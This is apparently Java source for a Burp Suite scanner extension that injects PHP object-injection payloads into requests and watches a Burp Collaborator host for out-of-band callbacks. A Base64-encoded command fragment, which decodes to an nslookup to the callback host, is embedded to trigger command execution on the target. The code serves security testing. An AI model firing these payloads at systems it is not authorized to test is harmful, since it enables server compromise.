package burp;

import java.net.URL;
import java.io.PrintWriter;
import java.io.InputStreamReader;
import java.util.Iterator;
import java.util.ArrayList;
import java.util.List;
import static java.util.Collections.*;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

public class BurpExtender implements IBurpExtender, IScannerCheck, IContextMenuFactory {

    // Globals.
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private IContextMenuInvocation mInvocation;
    //
    private IBurpCollaboratorClientContext collaboratorContext;
    private String collaboratorHost;
    //
    public PrintWriter stdout;
    public PrintWriter stderr;

    @Override
    public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks) {
        // Keep a reference to our callbacks object.
        this.callbacks = callbacks;

        // Obtain an extension helpers object.
        helpers = callbacks.getHelpers();

        // Set our extension name.
        callbacks.setExtensionName("PHP Object Injection Slinger");

        // Register our context menu entry.
        callbacks.registerContextMenuFactory(this);

        // Create member versions of the StdOut and StdErr.
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);

        // Get a collaborator callback host.
        collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        collaboratorHost = "poi-slinger." + collaboratorContext.generatePayload(true);

        // Register ourselves as a custom scanner check.
        callbacks.registerScannerCheck(this);

        // Say Hi on stdout.
        stdout.println("--|> PHP Object Injection Slinger Extension Loaded <|--");
    }

    // This method is called when multiple issues are reported for the same URL
    // path by the same extension-provided check. The value we return from this
    // method determines how/whether Burp consolidates the multiple issues
    // to prevent duplication.
    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getUrl().equals(newIssue.getUrl()) &&
                existingIssue.getIssueName().equals(newIssue.getIssueName()) &&
                existingIssue.getIssueDetail().equals(newIssue.getIssueDetail()))
            return -1;
        else return 0;
    }

    private IScanIssue reportIssue(String name, String gen_with, String payload, IHttpRequestResponse sentRequestResponse, IBurpCollaboratorInteraction collaboratorInteraction) {
        // Highlight the Request.
        IHttpRequestResponse[] httpMessages = new IHttpRequestResponse[] {
            callbacks.applyMarkers(sentRequestResponse, buildRequestHighlights(payload, sentRequestResponse), emptyList())
        };
        // Create a new Issue.
        return new POISlingerScanIssue(sentRequestResponse.getHttpService(), helpers.analyzeRequest(sentRequestResponse).getUrl(), httpMessages, name, gen_with, payload, collaboratorInteraction);
    }

    private List<int[]> buildRequestHighlights(String payload, IHttpRequestResponse sentRequestResponse) {
        List<int[]> requestHighlights = new ArrayList<int[]>();
        int startOfPayload = helpers.indexOf(sentRequestResponse.getRequest(), helpers.stringToBytes(payload), true, 0, sentRequestResponse.getRequest().length);
        if (startOfPayload != -1) {
            requestHighlights.add(new int[] {
                startOfPayload, startOfPayload + payload.length()
            });
        }
        return requestHighlights;
    }

    // This method adds a context menu entry to Proxy/Target/Intruder/Repeater Tabs for the extension.
    @Override
    public List<JMenuItem> createMenuItems(final IContextMenuInvocation invocation) {
        List<JMenuItem> menuList = new ArrayList<>();
        mInvocation = invocation;
        if (mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_PROXY_HISTORY ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_SCANNER_RESULTS ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_SEARCH_RESULTS ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_INTRUDER_PAYLOAD_POSITIONS ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_INTRUDER_ATTACK_RESULTS ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_MESSAGE_EDITOR_REQUEST ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_MESSAGE_VIEWER_REQUEST ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_TARGET_SITE_MAP_TREE ||
            mInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_TARGET_SITE_MAP_TABLE) {
            JMenuItem markScan = new JMenuItem("Send To POI Slinger");
            markScan.addActionListener(new ActionListener() {
               @Override
               public void actionPerformed(ActionEvent arg0) {
                   if (arg0.getActionCommand().equals("Send To POI Slinger")) {
                       POISlingerScan(mInvocation.getSelectedMessages());
                   }
               }
            });
            menuList.add(markScan);
        }
        return menuList;
    }

    private void POISlingerScan(IHttpRequestResponse[] messages) {
        for (int i=0; i < messages.length; i++) {
            try {
                URL url = new URL(messages[i].getHttpService().getProtocol(), messages[i].getHttpService().getHost(), messages[i].getHttpService().getPort(), "");
                if (!callbacks.isInScope(url)) {
                    int ans = JOptionPane.showConfirmDialog(null, "This item is not in scope. Would you like to add it?\r\n" + url.toString(), "Add to Scope?", JOptionPane.YES_NO_OPTION);
                    if (ans == JOptionPane.YES_OPTION) {
                        callbacks.includeInScope(url);
                    }
                }
                if (callbacks.isInScope(url)) {
                    callbacks.doActiveScan(
                        messages[i].getHttpService().getHost(),
                        messages[i].getHttpService().getPort(),
                        messages[i].getHttpService().getProtocol().equalsIgnoreCase("HTTPS"),
                        messages[i].getRequest());
                    // Highlight and set a Comment on the HTTP Request on the Proxy Tab.
                    messages[i].setHighlight("pink");
                    messages[i].setComment("Sent to POI Slinger");
                }
            }
            catch (Exception e) {
                stderr.println("Error creating URL: " + e.getMessage());
            }
        }
    }

    // Read and parse the embeded payloads.json file and return a JSONArray.
    public JSONArray getPayloadData() {
        JSONArray jsonarray = null;
        try {
            JSONParser parser = new JSONParser();
            Object obj = parser.parse(new InputStreamReader(getClass().getResourceAsStream("/payloads.json")));
            jsonarray = (JSONArray) obj;
        }
        catch(Exception e) {
            e.printStackTrace();
        }
        return jsonarray;
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        // We don't do any passive scanning with this extension.
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        // Print Generated Colaborator Callback Host on stdout for debugging purposes.
        stdout.println("\nGenerated Colaborator Callback Host: " + collaboratorHost);

        // Get the payload data from the payloads.json file.
        JSONArray payloaddata = getPayloadData();

        // Interate through each payload.
        Iterator<?> iter = payloaddata.iterator();
        while (iter.hasNext()) {

            JSONObject json = (JSONObject) iter.next();
            String payload = (String) json.get("payload");
            String gen_with = (String) json.get("gen_with");
            String name = (String) json.get("name");

            // Replace the hardcoded string CHANGEME on each payload with the generated Colaborator Callback Host.
            if ((Boolean) json.get("_needs_dynamic_payload_editing")) {
                // Payload editing for special cases (ex: Yii and maybe future others).
                byte[] decodedBytes = helpers.base64Decode("OTk5OTk5OTk5OW5zbG9va3VwIENIQU5HRU1F".getBytes());
                String temp_decodedBytes = new String(decodedBytes);
                temp_decodedBytes = temp_decodedBytes.replace("CHANGEME", collaboratorHost);
                byte[] encodedBytes = helpers.base64Encode(temp_decodedBytes).getBytes();
                String temp_encodedBytes = new String(encodedBytes);
                payload = payload.replace("OTk5OTk5OTk5OW5zbG9va3VwIENIQU5HRU1F", temp_encodedBytes);
            } else {
                payload = payload.replace("CHANGEME",collaboratorHost);
            }

            // Print payloads on stdout for debugging purposes.
            stdout.println("\nSending Payload For: " + name + ": \n" + payload +"\n\n");

            // First round sends the payload URL encoded, Second round sends the payload Base64 encoded.
            for (int i = 0; i < 2; i++) {
                // Make a request containing our payload in the insertion point.
                byte[] checkRequest = insertionPoint.buildRequest(i == 1 ? helpers.base64Encode(helpers.urlDecode(payload)).getBytes() : helpers.urlDecode(payload).getBytes());
                IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);
                // Fetch collaborator callback host interactions that may have occurred for the current injected payload.
                List<IBurpCollaboratorInteraction> collaboratorInteractions_payload = collaboratorContext.fetchCollaboratorInteractionsFor(payload);
                // Fetch ANY collaborator callback host interactions that may have occurred.
                List<IBurpCollaboratorInteraction> collaboratorInteractions_all = collaboratorContext.fetchAllCollaboratorInteractions();
                if (!collaboratorInteractions_payload.isEmpty()) {
                    // Report a specific interaction due to a payload injection.
                    stdout.println("Interaction detected on Collaborator Callback Host!");
                    return singletonList(reportIssue(name, gen_with, payload, checkRequestResponse, collaboratorInteractions_payload.get(0)));
                } else if (!collaboratorInteractions_all.isEmpty()) {
                    // Report any interaction - pickup any delayed collaborator callback host interaction from other previous payload injection.
                    stdout.println("Interaction detected on Collaborator Callback Host!");
                    return singletonList(reportIssue(name, gen_with, payload, checkRequestResponse, collaboratorInteractions_all.get(0)));
                } else { stdout.println("No interaction detected on Collaborator Callback Host."); }
            }
        }
        return null;
    }

}
